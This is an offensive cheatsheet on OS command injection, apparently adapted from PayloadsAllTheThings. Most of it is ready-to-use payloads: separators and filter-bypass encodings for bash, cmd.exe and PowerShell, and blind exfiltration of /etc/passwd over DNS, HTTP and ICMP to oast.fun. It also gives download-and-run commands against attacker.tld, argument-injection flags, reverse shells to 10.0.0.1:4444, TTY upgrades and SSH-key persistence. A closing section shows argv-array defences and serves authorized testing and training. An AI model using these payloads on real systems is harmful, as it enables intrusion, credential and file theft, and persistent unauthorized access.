---
title: "Command Injection - Separators, Filter Bypass and Argument Injection"
category: web
subcategory: command-injection
type: cheatsheet
tags: [command-injection, os-command-injection, rce, argument-injection, shell-metacharacters, blind-injection, oob, dns-exfil, ifs, wildcard, base64, system, exec, shell-exec, subprocess, execve, reverse-shell, tty-upgrade, interactsh, burp]
summary: "Per-shell separator tables, blind/OOB detection, argument-injection flags, quoting escapes, filter-bypass mechanics explained, TTY upgrade and the execve defence."
tools: [interactsh, burp, ffuf, curl, netcat, socat]
source:
  name: "PayloadsAllTheThings - Command Injection"
  url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection"
related: [lfi-wrappers-and-paths, ssrf-payloads, net-reverse-shell-cheatsheet]
---

## Where it lives

```text
# Any feature that shells out. Look for functionality whose name implies a CLI tool:
#   ping / traceroute / nslookup / whois / dig        -> network diagnostics pages
#   convert / resize / thumbnail                      -> ImageMagick, ffmpeg
#   pdf / html-to-pdf / screenshot                    -> wkhtmltopdf, chrome --headless
#   backup / export / archive / zip                   -> tar, zip, mysqldump
#   git clone / update / deploy                       -> git, rsync, ssh
#   antivirus scan / file type                        -> clamscan, file
#   send mail                                         -> sendmail, mail
#   unzip / extract                                   -> unzip, 7z, tar
#
# The sink in source code:
#   PHP     system() exec() shell_exec() passthru() popen() proc_open() `backticks`
#           mail() with a 5th argument, escapeshellcmd() misuse
#   Python  os.system() os.popen() subprocess.*(shell=True) commands.getoutput()
#   Node    child_process.exec() execSync() spawn(..., {shell:true})
#   Ruby    system() exec() `backticks` %x{} open("|cmd") Kernel#open
#   Java    Runtime.exec("sh -c " + s)  ProcessBuilder("bash","-c",s)
#   Go      exec.Command("sh","-c", s)
#   Perl    system() open(FH,"cmd|") qx{}
```

## Separators and metacharacters -- bash / sh

```bash
# ; runs the next command unconditionally -- the statement terminator.
127.0.0.1; id

# && runs the next command ONLY if the first exited 0. Use it when you need the
# original command to look successful, or to confirm the first half really ran.
127.0.0.1 && id

# || runs the next command ONLY if the first FAILED. This is the one to use when the
# injected value makes the original command error out anyway (e.g. an invalid host).
invalidhost || id

# | pipes stdout of the first into the second. The second command's output is what
# you see, which is convenient when only the tail of the output is rendered.
127.0.0.1 | id

# & backgrounds the first command and immediately runs the next. Output ordering is
# racy, but it fires even when the first command hangs.
127.0.0.1 & id

# newline: the shell treats \n exactly like ; -- it is a command separator. This is
# the bypass for filters that blacklist ; && || | but forget %0a.
127.0.0.1%0aid
127.0.0.1%0d%0aid

# command substitution: the inner command runs FIRST and its output is substituted
# into the outer command line. Works inside double quotes, unlike ; and |.
127.0.0.1 $(id)
127.0.0.1 `id`
$(id)
`id`
# nested substitution survives a filter that strips one level of $( )
$(echo $(id))

# process substitution: <(cmd) exposes cmd's output as a /dev/fd path
cat <(id)

# ${ } parameter expansion is evaluated in double quotes; the IFS variable is the
# field separator, so ${IFS} is a space that contains no space character
cat${IFS}/etc/passwd

# arithmetic expansion also evaluates a substitution
$((1+1))

# redirection: writes output where you can fetch it, for blind cases
127.0.0.1 > /var/www/html/o.txt
127.0.0.1; id > /var/www/html/o.txt
# stderr is often the only stream rendered -- merge it into stdout
127.0.0.1; id 2>&1
127.0.0.1; id 2>&1 | tee /tmp/o

# comment: # makes the shell ignore everything after it, which removes the trailing
# part of the original command (the closing quote, extra flags, a fixed suffix)
127.0.0.1; id #
```

```text
# bash-specific characters that sh (dash) does not have:
#   <(cmd) >(cmd)     process substitution
#   {a,b}             brace expansion
#   ${var//x/y}       pattern substitution
#   $'...'            ANSI-C quoting: $'\x69\x64' is the string "id"
#   [[ ]]             extended test
# If the target is /bin/sh -> dash (Debian default), these fail. Test with:
#   127.0.0.1; echo {a,b}      bash prints "a b", dash prints "{a,b}"
```

## Separators and metacharacters -- cmd.exe

```text
&        run the next command unconditionally      127.0.0.1 & whoami
&&       run the next command only if the first succeeded
|        pipe stdout into the next command
||       run the next command only if the first failed
%0a      newline -- a separator in a .bat/.cmd context
^        the cmd.exe ESCAPE character. ^ before a char removes its special meaning,
         and ^ before nothing is dropped -- so who^ami still runs whoami. This is the
         core string-filter bypass on Windows.
%VAR%    environment expansion, evaluated before the command runs
%CD:~0,1%  substring of an env var -- builds characters you cannot type directly.
         %CD% is usually C:\..., so %CD:~0,1% is "C" and %CD:~-1% is the last char.
%PROGRAMFILES:~10,-5%  a classic way to produce a space character
"        quoting; cmd.exe has no single-quote concept at all
2>&1     merge stderr into stdout
>        redirect to a file:   whoami > C:\inetpub\wwwroot\o.txt
```

```text
# worked examples
127.0.0.1 & whoami
127.0.0.1 && type C:\Windows\win.ini
127.0.0.1 | net user
w^h^o^a^m^i                          # caret-obfuscated, cmd strips the carets
c:\windows\system32\cmd.exe /c whoami
127.0.0.1 & certutil -urlcache -split -f http://attacker.tld/n.exe C:\Windows\Temp\n.exe
127.0.0.1 & powershell -nop -w hidden -enc <base64-utf16le>
```

## Separators and metacharacters -- PowerShell

```powershell
# ; is the statement separator, same as bash
127.0.0.1; whoami

# | pipes OBJECTS, not text -- so a pipeline into a cmdlet behaves differently
Get-Process | Select-Object Name

# $( ) subexpression: evaluated inside double-quoted strings
"user is $(whoami)"

# & is the call operator: it invokes the string that follows as a command name.
# This is how you run a command whose name is built at runtime.
& 'who' + 'ami'
$c = 'whoami'; & $c
Invoke-Expression 'whoami'      # iex: evaluates a string as PowerShell code
iex (New-Object Net.WebClient).DownloadString('http://attacker.tld/s.ps1')

# backtick ` is the PowerShell escape char -- like ^ in cmd, it hides a character
# from a naive string filter while the parser ignores it
w`h`o`a`m`i

# encoded command: -EncodedCommand takes base64 UTF-16LE, so no quoting or special
# characters survive to be filtered
powershell -nop -enc dwBoAG8AYQBtAGkA

# format operator builds a string from parts
('{0}{1}' -f 'who','ami') | iex

# character arithmetic builds a string with no letters in the source
[char]119 + [char]104 + [char]111   # "who"
```

## Detection probes

```bash
# 1. delay-based -- the most reliable universal oracle. Baseline first, then compare.
127.0.0.1; sleep 10
127.0.0.1 && sleep 10
127.0.0.1 | sleep 10
127.0.0.1 || sleep 10
127.0.0.1 %0a sleep 10
$(sleep 10)
`sleep 10`
# Windows has no sleep, use ping's timing (one ping per second, -n counts the pings)
127.0.0.1 & ping -n 10 127.0.0.1
127.0.0.1 & timeout /t 10

# 2. output-based -- when the command's stdout is rendered back
127.0.0.1; id
127.0.0.1; whoami
127.0.0.1; uname -a
# arithmetic that proves EXECUTION rather than reflection: "7*7" echoed back is
# reflection, "49" is execution
127.0.0.1; expr 7 \* 7
127.0.0.1; echo $((7*7))

# 3. error-based -- a nonexistent binary produces a distinctive shell error
127.0.0.1; zzzz
#   "sh: 1: zzzz: not found"        -> dash
#   "bash: zzzz: command not found" -> bash
#   "'zzzz' is not recognized..."   -> cmd.exe
# the wording itself fingerprints the shell for you

# 4. file-write oracle -- when there is no output and no time control
127.0.0.1; id > /var/www/html/o.txt      # then GET /o.txt
127.0.0.1; cp /etc/passwd /var/www/html/ # then GET /passwd
```

## Blind / out-of-band detection

```bash
# When nothing is rendered and timing is unreliable, make the SERVER talk to you.
# Start a listener first:   interactsh-client -v    (or use Burp Collaborator)

# --- DNS: the highest-success channel. DNS egress is almost always allowed, and the
# lookup happens even when outbound HTTP is firewalled, because the resolver does it.
127.0.0.1; nslookup $(whoami).x.oast.fun
127.0.0.1; dig $(whoami).x.oast.fun
127.0.0.1; host $(id | base64 | tr -d '=' | head -c 60).x.oast.fun
127.0.0.1; ping -c 1 $(whoami).x.oast.fun
# Windows
127.0.0.1 & nslookup %USERNAME%.x.oast.fun
127.0.0.1 & ping %COMPUTERNAME%.x.oast.fun

# --- data encoding rules for DNS exfil, learned the hard way:
#   labels are max 63 chars, the whole name max 253
#   DNS is case-insensitive, so base64 (mixed case) gets mangled -> use base32 or hex
#   / + = are illegal in labels -> strip or translate them
127.0.0.1; nslookup $(cat /etc/passwd | base32 | tr -d '=' | head -c 60).x.oast.fun
127.0.0.1; nslookup $(cat /flag.txt | xxd -p | head -c 60).x.oast.fun
# chunked, for anything longer than one label
127.0.0.1; for i in $(cat /etc/passwd | base32 | tr -d '=' | fold -w50 | head -20 | cat -n | tr -s ' ' '-'); do host $i.x.oast.fun; done

# --- HTTP: carries far more data per request and shows you the body directly
127.0.0.1; curl http://x.oast.fun/$(whoami)
127.0.0.1; curl -d "$(cat /etc/passwd)" http://x.oast.fun/
127.0.0.1; wget -q -O- http://x.oast.fun/$(id | base64 -w0)
127.0.0.1; curl -X POST --data-binary @/etc/passwd http://x.oast.fun/
# no curl and no wget? almost every box has one of these
127.0.0.1; python3 -c 'import urllib.request;urllib.request.urlopen("http://x.oast.fun/"+__import__("os").popen("id").read())'
127.0.0.1; perl -e 'use LWP::Simple; get("http://x.oast.fun/".`id`)'
127.0.0.1; exec 3<>/dev/tcp/x.oast.fun/80; echo -e "GET /$(id|tr ' ' '_') HTTP/1.0\r\n\r" >&3
# bash's /dev/tcp is a builtin -- no external binary needed at all

# --- ICMP, when only ping is allowed out
127.0.0.1; ping -c 1 -p $(echo -n FLAG | xxd -p) x.oast.fun
```

## Argument injection

```text
# Sometimes you cannot inject a SEPARATOR, but your input becomes an ARGUMENT to a
# fixed binary. Adding a flag can still turn that binary into a file read, a file
# write, or full code execution -- no shell metacharacter required.
# This is what happens when a developer "fixed" injection by switching to an argv
# array but still concatenates user input into one of the elements.
```

```bash
# curl: write the response anywhere the process can write, or read a local file
curl -o /var/www/html/s.php http://attacker.tld/s.php      # arbitrary file WRITE
curl -K /etc/passwd                                        # -K reads a config file;
                                                           # parse errors echo its content
curl file:///etc/passwd                                    # arbitrary file READ

# wget: same two primitives
wget --output-document=/var/www/html/s.php http://attacker.tld/s.php
wget --post-file=/etc/passwd http://x.oast.fun/            # exfil a local file

# tar: --checkpoint-action runs a command; --to-command pipes each member to a shell
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar -xf a.tar --to-command='id'

# zip / unzip
zip a.zip a -T -TT 'sh #'                                  # -TT sets the test command
unzip -o archive.zip -d /var/www/html                       # write into the docroot

# ssh / scp / rsync: ProxyCommand and -e run a shell command
ssh -o ProxyCommand='id' x
scp -S /bin/sh x y
rsync -e 'sh -c id' x::

# git: core.sshCommand and upload-pack are command hooks
git clone --upload-pack='id' ssh://x/y
git -c core.sshCommand='id' clone ssh://x/y
git clone --config core.fsmonitor='id' http://x/y.git

# find: -exec is the obvious one
find . -name x -exec id \;

# awk / sed / perl: all have a system escape
awk 'BEGIN{system("id")}' /dev/null
sed 's/x/y/e' /etc/passwd            # the e flag EXECUTES the pattern space (GNU sed)
perl -e 'system("id")'

# ffmpeg / ImageMagick: -i accepts protocol URLs -> SSRF and local file read
ffmpeg -i /etc/passwd out.mp4
convert 'msl:/tmp/x.msl' out.png     # MSL is a scripting format -> file write

# php / python / node as the target binary
php -r 'system("id");'
python3 -c 'import os;os.system("id")'
node -e 'require("child_process").execSync("id")'

# mysql / psql
mysql -e '\! id'                     # \! shells out from the client
psql -c '\! id'

# the general rule: if your input lands before a filename argument, test whether a
# leading - is accepted. A value starting with - is parsed as a FLAG, not a path.
# Defence for the developer: pass  --  before the user value, which ends flag parsing.
tar -xf -- "$userfile"
```

## Quoting-context escapes

```bash
# You are inside DOUBLE quotes:  ping -c 1 "USER_INPUT"
# Double quotes still allow $( ), ` `, and $VAR expansion -- so you do NOT need to
# escape at all.
" ; id ; "
$(id)
`id`
${IFS}
# closing the quote also works
"; id; echo "

# You are inside SINGLE quotes:  ping -c 1 'USER_INPUT'
# Single quotes suppress EVERYTHING, including $ and backticks. You must close the
# quote first -- there is no in-quote expansion to abuse.
'; id; '
'; id; echo '
' $(id) '

# You are UNQUOTED:  ping -c 1 USER_INPUT
# Everything is live: separators, expansion, globbing, word splitting.
; id
| id
$(id)

# You are inside a double-quoted string that also gets escapeshellarg()'d:
# escapeshellarg wraps the value in single quotes and escapes embedded single quotes,
# so the value cannot break out -- but it can still be an ARGUMENT (see above).
# escapeshellcmd() is the weak one: it escapes metacharacters but NOT the ability to
# add a new flag, and it leaves paired quotes intact.

# Windows, inside double quotes: cmd.exe has no single quote, and & inside quotes is
# literal -- so you must close the quote to inject
" & whoami & "
```

## Filter-bypass mechanics

```bash
# --- Space filtered ---
# $IFS is the shell's Internal Field Separator, default " \t\n". The shell expands
# ${IFS} to a space, so the command line contains no literal space byte.
cat${IFS}/etc/passwd
cat$IFS/etc/passwd            # works when the next char cannot continue a var name
cat${IFS}$9/etc/passwd        # $9 is an unset positional param -> empty, terminates IFS
{cat,/etc/passwd}             # brace expansion splits on commas into separate words
cat</etc/passwd               # redirection needs no space at all
X=$'\x20';cat${X}/etc/passwd  # build a space from its hex code
cat%09/etc/passwd             # a literal TAB is also a word separator
IFS=,;`cat<<<cat,/etc/passwd` # redefine IFS entirely

# --- Slash filtered ---
# ${HOME:0:1} is a substring of $HOME, which is "/" -- the character exists in the
# environment even when you cannot type it.
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat ${PWD:0:1}etc${PWD:0:1}passwd
cat $(echo -e "\x2fetc\x2fpasswd")
# relative navigation avoids / entirely if cwd is deep enough
cd ..;cd ..;cd etc;cat passwd

# --- Specific commands blacklisted ---
# The shell resolves the command name AFTER expansion, so any construct that produces
# the right bytes at expansion time works, even though the literal never appears.
c''at /etc/passwd             # empty single quotes are removed by the shell
c""at /etc/passwd             # same with double quotes
c\at /etc/passwd              # a backslash before a non-special char is just dropped
ca$@t /etc/passwd             # $@ is empty when there are no positional params
ca${x}t /etc/passwd           # unset variable expands to nothing
/bin/c'a't /etc/passwd
$'\x63\x61\x74' /etc/passwd   # ANSI-C quoting builds "cat" from hex (bash only)
$(printf "\x63\x61\x74") /etc/passwd
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh        # base64 indirection
echo -n 'cat /etc/passwd' | rev | rev | sh        # trivially defeats a substring check
$(rev<<<'daph/cte/ tac')                          # reversed source
xxd -r -p <<< '636174202f6574632f706173737764' | sh   # hex indirection

# --- Wildcards: the shell expands globs to real filenames, so you never type the
# name. Each ? matches exactly one char, so /???/c?t is /bin/cat if that path exists.
/???/??t /etc/passwd
/bin/c?t /etc/passwd
/???/??????32 -h              # /bin/base32
/usr/bin/w?o?m?               # whoami
cat /e??/p??s??               # glob the target path too
/bin/[c]at /etc/passwd        # a one-char bracket class
# wildcards also work for netcat-style binaries with version suffixes
/bin/nc*

# --- Wildcard ARGUMENT injection (the "wildcard spare" trick): when a command runs
# with * as an argument in a directory you can write to, filenames beginning with -
# are parsed as flags. Create a file named "--checkpoint-action=exec=sh" and the
# cron job `tar -cf backup.tar *` runs your shell.
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh sh.sh'

# --- Command-name concatenation via variables
a=c;b=at;$a$b /etc/passwd
a=/e;b=tc/pa;c=sswd;cat $a$b$c

# --- Blacklisted characters built from environment substrings
echo ${PATH:0:1}              # "/"
echo ${LS_COLORS:10:1}        # frequently ";" -- inspect env and pick the offsets

# --- Output-redirection trick when only the command name is allowed
# ls -t sorts newest-first; a file named with your command becomes the script body
echo id > x; sh x

# --- Newline injection into a config/crontab that the app later runs
# %0a in a value that is written to a file consumed by cron or a shell profile

# --- Encoding the payload so the WAF sees nothing recognisable
echo -n 'id' | base64          # aWQ=
;echo aWQ=|base64 -d|sh
;echo -e "\x69\x64"|sh
;{echo,aWQ=}|{base64,-d}|{sh,}   # combines brace expansion with base64 indirection
```

```text
# Why these keep working, in one sentence each:
#   quoting/backslash removal happens BEFORE command lookup, so c''at resolves to cat
#   variable and brace expansion happen BEFORE word splitting, so ${IFS} becomes a
#     separator that was never a space byte in your request
#   globbing happens BEFORE execution, so /???/??t is a filename the shell produced
#   command substitution is a nested shell, so any filter on the outer string is
#     irrelevant to what the inner one runs
#   base64/hex/rev indirection moves the dangerous bytes past every static inspector,
#     because the decoder -- not your request -- produces them
# A blacklist can only ever match the bytes you send; the shell executes the bytes
# that EXIST AFTER EXPANSION. That gap is the whole game.
```

## Getting interactive output back

```bash
# --- listener side ---
nc -lvnp 4444                       # plain
rlwrap nc -lvnp 4444                # with readline: arrow keys and history work
socat file:`tty`,raw,echo=0 tcp-listen:4444   # a fully interactive listener, no upgrade needed

# --- target side: reverse shells, in order of what is usually available ---
bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
sh -i >& /dev/tcp/10.0.0.1/4444 0>&1
nc -e /bin/sh 10.0.0.1 4444                       # only if nc has -e compiled in
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f   # -e-less nc
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.0.0.1",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
perl -e 'use Socket;$i="10.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
php -r '$s=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
socat TCP:10.0.0.1:4444 EXEC:'bash -li',pty,stderr,setsid,sigint,sane
busybox nc 10.0.0.1 4444 -e /bin/sh

# --- TTY upgrade: the standard sequence ---
# Why it is needed: a raw reverse shell has no controlling terminal, so there is no
# job control (Ctrl-C kills your listener), no tab completion, no arrow keys, and
# interactive programs (su, ssh, vi, sudo prompts) refuse to run.
#
# 1. spawn a pseudo-terminal inside the shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
#    fallbacks when python is absent:
script -qc /bin/bash /dev/null
perl -e 'exec "/bin/bash";'
/usr/bin/expect -c 'spawn /bin/bash; interact'
#
# 2. background the shell -- from YOUR terminal, not the target's
Ctrl-Z
#
# 3. put YOUR terminal in raw mode so keystrokes pass through untranslated, and
#    disable local echo so you do not see each character twice
stty raw -echo; fg
#    (press Enter once or twice after fg -- the prompt is usually not redrawn)
#
# 4. tell the remote shell what terminal it is talking to, and match the window size
#    so full-screen programs render correctly. Get the numbers from `stty size` in a
#    local terminal BEFORE step 2.
export TERM=xterm-256color
stty rows 50 cols 200
export SHELL=/bin/bash
#
# 5. verify
tty            # should print /dev/pts/N, not "not a tty"

# --- if you lose the terminal afterwards ---
reset
stty sane

# --- alternative: skip the upgrade entirely with socat on both ends ---
# listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444
# target (needs socat present or uploaded):
socat TCP:10.0.0.1:4444 EXEC:'bash -li',pty,stderr,setsid,sigint,sane

# --- upgrade to a real session once you have any shell ---
# add your key and log in over SSH -- stable, and survives the web request timeout
mkdir -p ~/.ssh && echo 'ssh-ed25519 AAAA... you' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys
```

## Defence

```text
# The rule: DO NOT INVOKE A SHELL. Every payload above depends on a shell parsing a
# string. Hand the kernel an argv ARRAY instead and there is no parser to trick --
# argv[1] is a filename, and a filename containing "; id" is just an odd filename.
```

```python
# Python -- shell=False (the default) passes a list straight to execve(2).
# There is no /bin/sh in the picture, so ; | $() && are all inert data.
import subprocess, ipaddress

def ping(host: str) -> str:
    ipaddress.ip_address(host)                # validate: raises on anything but an IP
    return subprocess.run(
        ["/bin/ping", "-c", "1", "-W", "2", "--", host],   # argv array, absolute path
        capture_output=True, text=True, timeout=5,
        shell=False,                          # NEVER True with user input
    ).stdout

# The bug this replaces:
#   subprocess.run(f"ping -c 1 {host}", shell=True)
#   os.system("ping -c 1 " + host)
```

```php
<?php
// PHP -- proc_open with an ARRAY command (PHP 7.4+) skips the shell entirely.
// escapeshellarg() is the fallback for the string APIs, but it only makes the value
// one argument; it does not stop ARGUMENT injection, so validate the value too.
$host = $_GET['host'] ?? '';
if (!filter_var($host, FILTER_VALIDATE_IP)) { http_response_code(400); exit; }

$p = proc_open(['/bin/ping', '-c', '1', '--', $host],
               [1 => ['pipe','w'], 2 => ['pipe','w']], $pipes);
$out = stream_get_contents($pipes[1]);
proc_close($p);

// weaker, string-API fallback -- still needs the validation above
// $out = shell_exec('/bin/ping -c 1 -- ' . escapeshellarg($host));
```

```javascript
// Node -- execFile/spawn WITHOUT {shell:true} use execve directly.
// child_process.exec() ALWAYS spawns /bin/sh, so it is never safe with user input.
const { execFile } = require('node:child_process');
const net = require('node:net');

function ping(host, cb) {
  if (net.isIP(host) === 0) return cb(new Error('not an IP'));
  execFile('/bin/ping', ['-c', '1', '--', host], { timeout: 5000 }, cb);
}
```

```java
// Java -- ProcessBuilder with separate arguments. The bug is
// Runtime.getRuntime().exec("sh -c ping " + host)
ProcessBuilder pb = new ProcessBuilder("/bin/ping", "-c", "1", "--", host);
pb.redirectErrorStream(true);
Process p = pb.start();
```

```go
// Go -- exec.Command's first arg is the binary, the rest are argv. Safe by default.
// The bug is exec.Command("sh", "-c", "ping "+host)
cmd := exec.Command("/bin/ping", "-c", "1", "--", host)
out, err := cmd.CombinedOutput()
```

```text
# Layered controls, in priority order:
#
# 1. Do not shell out at all. Use a library: a DNS resolver instead of `dig`, an
#    image library instead of `convert`, an archive library instead of `tar`.
#
# 2. If you must exec: argv array, absolute binary path, shell=False.
#
# 3. ALLOWLIST the value, do not blacklist characters. Validate with a positive
#    pattern (^[a-zA-Z0-9.-]{1,253}$ for a hostname, an ip_address() parse for an IP,
#    membership in a fixed set for anything enumerable). Reject on failure -- do not
#    strip, because stripping is how ....// and c''at survive.
#
# 4. Terminate flag parsing with --  before any user-controlled value, so a value
#    starting with - cannot become an option (this closes the argument-injection
#    section above).
#
# 5. Never let user input choose the BINARY, a config-file path, or an option name.
#    Those are the argument-injection sinks even when quoting is perfect.
#
# 6. Drop privileges: run the worker as a dedicated unprivileged user, in a container
#    with a read-only root filesystem, no capabilities, and no outbound network
#    unless the feature needs it. This removes the OOB channel and the write targets.
#
# 7. Set an execution timeout and an output size cap, so a `sleep 60` or a
#    `cat /dev/urandom` cannot become a DoS.
#
# 8. Egress filtering kills the blind-detection section: no DNS to arbitrary
#    resolvers, no outbound HTTP from the app tier. Attackers who cannot get data
#    out are limited to timing.
#
# 9. Log the full argv of every spawned process. Command injection is extremely
#    loud once you can see what was actually executed.
```

## References

- https://owasp.org/www-community/attacks/Command_Injection
- https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
- https://portswigger.net/web-security/os-command-injection
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Argument%20Injection
- https://book.hacktricks.xyz/pentesting-web/command-injection
- https://gtfobins.github.io/
